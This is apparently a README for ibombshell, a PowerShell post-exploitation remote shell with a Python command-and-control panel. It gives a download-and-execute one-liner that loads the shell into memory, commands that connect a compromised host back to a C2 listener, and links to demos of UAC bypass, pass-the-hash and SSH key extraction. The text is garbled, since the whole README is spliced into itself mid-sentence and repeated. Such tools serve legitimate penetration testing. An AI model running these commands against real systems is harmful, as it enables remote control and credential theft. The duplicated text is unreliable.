![Supported Python versions](https://img.shields.io/badge/python-3.6-blue.svg?style=flat-square)
![License](https://img.shields.io/badge/license-GNU-green.svg?style=flat-square)

# **ibombshell - Dynamic Remote Shell**

```
      ,--.!,    _ ____                  __   _____ __         ____  
   __/   -*-   (_) __ )____  ____ ___  / /_ / ___// /_  ___  / / /  
 ,d08b.  '|`  / / __  / __ \/ __ `__ \/ __ \\__ \/ __ \/ _ \/ / /  
 0088MM      / / /_/ / /_/ / / / / / / /_/ /__/ / / / /  __/ / /  
 `9MMP'     /_/_____/\____/_/ /_/ /_/_.___/____/_/ /_/\___/_/_/  

 [+] Starting the console...
 [*] Console ready!
```

**ibombshell** is a tool written in Powershell that allows you ![Supported Python versions](https://img.shields.io/badge/python-3.6-blue.svg?style=flat-square)
![License](https://img.shields.io/badge/license-GNU-green.svg?style=flat-square)

# **ibombshell - Dynamic Remote Shell**

```
      ,--.!,    _ ____                  __   _____ __         ____  
   __/   -*-   (_) __ )____  ____ ___  / /_ / ___// /_  ___  / / /  
 ,d08b.  '|`  / / __  / __ \/ __ `__ \/ __ \\__ \/ __ \/ _ \/ / /  
 0088MM      / / /_/ / /_/ / / / / / / /_/ /__/ / / / /  __/ / /  
 `9MMP'     /_/_____/\____/_/ /_/ /_/_.___/____/_/ /_/\___/_/_/  

 [+] Starting the console...
 [*] Console ready!
```

**ibombshell** is a tool written in Powershell that allows you to have a prompt at any time with post-exploitation functionalities (and in some cases exploitation). It is a shell that is downloaded directly to memory providing access to a large number of pentesting features. These functionalities can be downloaded directly to memory, in the form of a Powershell function. This form of execution is known as *everywhere*.

In addition, *ibombshell* provides a second execution mode called *Silently*, so the pentester can execute an instance of ibombshell (called *warrior*). The compromised computer will be connected to a C2 panel through HTTP. Therefore, it will be possible to control the warrior and be able to load functions in memory that help the pentester. This is happening whithin the post-exploitation phase.

# macOS fork

This fork is meant to be used to create some features to the macOS powershell.

## Install powershell in macOS

1, Install Homebrew for mac:

```https://brew.sh```

2, Install Hombrew-Cask to install new packages:

```brew tap caskroom/cask```

3, Install PowerShell

```brew cask install powershell```

4, Verify the installation

```pwsh```

# Prerequisities

To run *ibombshell everywhere* it is mandatory to have PowerShell 3.0 or higher. For operating systems other than Windows you can read more about this in the [PowerShell GitHub](https://github.com/PowerShell/PowerShell) - *PowerShell for every system!*.

To run the *ibombshell silently mode* you need python 3.6 and some python libraries. You can install this with:

```[python]
cd ibombshell\ c2/
pip install -r requirements.txt
```

**Note**: ibombshell C2 works in **python 3.X**. Make sure you run a pip relative to this version.

# Usage

ibombshell has two execution modes:

## ibombshell everywhere

To load ibombshell simply run on PowerShell:

```[powershell]
iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/lucferbux/ibombshell/master/console’)
```

Now you can run the downloaded ibombshell console running:

```[powershell]
console
```

## ibombshell silently mode

This version allows you to run the ibombshell console and remotely control it from the C2 panel created in python. To run this version, first you must launch the console process in powershell:

```[powershell]
iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/lucferbux/ibombshell/master/console’)
```

On ibombshell C2 path, prepare the C2:

```[python]
python3 ibombshell.py
```

And create the listener where the warriors will connected:

```[ibombshell]
iBombShell> load modules/listener.py
[+] Loading module...
[+] Module loaded!
iBombShell[modules/listener.py]> run
```

The default listener port is 8080. Finally you can launch the console in silently mode on the host to get remote control:

```[powershell]
console -Silently -uriConsole http://[ip or domain]:[port]
```

# ibombshell C2 scheme

The basic operation of the ibombshell control panel follows the following scheme:

```[ascii]
        ibombshell                 C2
            |                      |
            |    newibombshell     |
            +--------------------->| --+ register
            |                      |<--+ from IP
            |    get functions     |
            |   and instructions   |
            +--------------------->|
            |                      |
            |    send functions    |
            |   and instructions   |
execute +-- |<---------------------+
        +-->|                      |
            |       results        |
            +--------------------->|
            |                      |
```

# Docker

We have created a docker container with everything you need to make it works. Run this command from Dockerfile location.

```[bash]
sudo docker build -t "ibombshell" .
sudo docker run -it ibombshell
```

# Example videos

Some example videos...

### *iBombShell: PoC Warrior + Bypass UAC + Pass the hash*

[![iBombShell: PoC Warrior + Bypass UAC + Pass the hash](https://img.youtube.com/vi/v4c8MsOPTyA/0.jpg)](http://www.youtube.com/watch?v=v4c8MsOPTyA)

### *iBombShell: macOS*

[![iBombShell: PoC de uso desde macOS](https://img.youtube.com/vi/DQlWGPS1CB4/0.jpg)](http://www.youtube.com/watch?v=DQlWGPS1CB4)

### *ibombshell: Extracting Private SSH Keys on Windows 10*

[![ibombshell: Módulo para extracción de claves privadas SSH en Windows 10](https://img.youtube.com/vi/v7iXEg9cTNY/0.jpg)](http://www.youtube.com/watch?v=v7iXEg9cTNY)

### *iBombShell: PoC savefunctions*

[![iBombShell: PoC savefunctions](https://img.youtube.com/vi/7UP09LdRJy0/0.jpg)](http://www.youtube.com/watch?v=7UP09LdRJy0)

# License

This project is licensed under the GNU General Public License - see the LICENSE file for details

# Contact

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

This software doesn't have a QA Process. This software is a Proof of Concept.

If you have any problems, you can contact:

<pablo@11paths.com> - *Ideas Locas CDO - Telefónica*

<alvaro.nunezromero@11paths.com> - *Laboratorio Innovación - ElevenPaths*

For more information please visit [https://www.elevenpaths.com](https://www.elevenpaths.com).to have a prompt at any time with post-exploitation functionalities (and in some cases exploitation). It is a shell that is downloaded directly to memory providing access to a large number of pentesting features. These functionalities can be downloaded directly to memory, in the form of a Powershell function. This form of execution is known as *everywhere*.

In addition, *ibombshell* provides a second execution mode called *Silently*, so the pentester can execute an instance of ibombshell (called *warrior*). The compromised computer will be connected to a C2 panel through HTTP. Therefore, it will be possible to control the warrior and be able to load functions in memory that help the pentester. This is happening whithin the post-exploitation phase.

# macOS fork

This fork is meant to be used to create some features to the macOS powershell.

## Install powershell in macOS

1, Install Homebrew for mac:

```https://brew.sh```

2, Install Hombrew-Cask to install new packages:

```brew tap caskroom/cask```

3, Install PowerShell

```brew cask install powershell```

4, Verify the installation

```pwsh```

# Prerequisities

To run *ibombshell everywhere* it is mandatory to have PowerShell 3.0 or higher. For operating systems other than Windows you can read more about this in the [PowerShell GitHub](https://github.com/PowerShell/PowerShell) - *PowerShell for every system!*.

To run the *ibombshell silently mode* you need python 3.6 and some python libraries. You can install this with:

```[python]
cd ibombshell\ c2/
pip install -r requirements.txt
```

**Note**: ibombshell C2 works in **python 3.X**. Make sure you run a pip relative to this version.

# Usage

ibombshell has two execution modes:

## ibombshell everywhere

To load ibombshell simply run on PowerShell:

```[powershell]
iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/lucferbux/ibombshell/master/console’)
```

Now you can run the downloaded ibombshell console running:

```[powershell]
console
```

## ibombshell silently mode

This version allows you to run the ibombshell console and remotely control it from the C2 panel created in python. To run this version, first you must launch the console process in powershell:

```[powershell]
iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/lucferbux/ibombshell/master/console’)
```

On ibombshell C2 path, prepare the C2:

```[python]
python3 ibombshell.py
```

And create the listener where the warriors will connected:

```[ibombshell]
iBombShell> load modules/listener.py
[+] Loading module...
[+] Module loaded!
iBombShell[modules/listener.py]> run
```

The default listener port is 8080. Finally you can launch the console in silently mode on the host to get remote control:

```[powershell]
console -Silently -uriConsole http://[ip or domain]:[port]
```

# ibombshell C2 scheme

The basic operation of the ibombshell control panel follows the following scheme:

```[ascii]
        ibombshell                 C2
            |                      |
            |    newibombshell     |
            +--------------------->| --+ register
            |                      |<--+ from IP
            |    get functions     |
            |   and instructions   |
            +--------------------->|
            |                      |
            |    send functions    |
            |   and instructions   |
execute +-- |<---------------------+
        +-->|                      |
            |       results        |
            +--------------------->|
            |                      |
```

# Docker

We have created a docker container with everything you need to make it works. Run this command from Dockerfile location.

```[bash]
sudo docker build -t "ibombshell" .
sudo docker run -it ibombshell
```

# Example videos

Some example videos...

### *iBombShell: PoC Warrior + Bypass UAC + Pass the hash*

[![iBombShell: PoC Warrior + Bypass UAC + Pass the hash](https://img.youtube.com/vi/v4c8MsOPTyA/0.jpg)](http://www.youtube.com/watch?v=v4c8MsOPTyA)

### *iBombShell: macOS*

[![iBombShell: PoC de uso desde macOS](https://img.youtube.com/vi/DQlWGPS1CB4/0.jpg)](http://www.youtube.com/watch?v=DQlWGPS1CB4)

### *ibombshell: Extracting Private SSH Keys on Windows 10*

[![ibombshell: Módulo para extracción de claves privadas SSH en Windows 10](https://img.youtube.com/vi/v7iXEg9cTNY/0.jpg)](http://www.youtube.com/watch?v=v7iXEg9cTNY)

### *iBombShell: PoC savefunctions*

[![iBombShell: PoC savefunctions](https://img.youtube.com/vi/7UP09LdRJy0/0.jpg)](http://www.youtube.com/watch?v=7UP09LdRJy0)

# License

This project is licensed under the GNU General Public License - see the LICENSE file for details

# Contact

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

This software doesn't have a QA Process. This software is a Proof of Concept.

If you have any problems, you can contact:

<pablo@11paths.com> - *Ideas Locas CDO - Telefónica*

<alvaro.nunezromero@11paths.com> - *Laboratorio Innovación - ElevenPaths*

For more information please visit [https://www.elevenpaths.com](https://www.elevenpaths.com).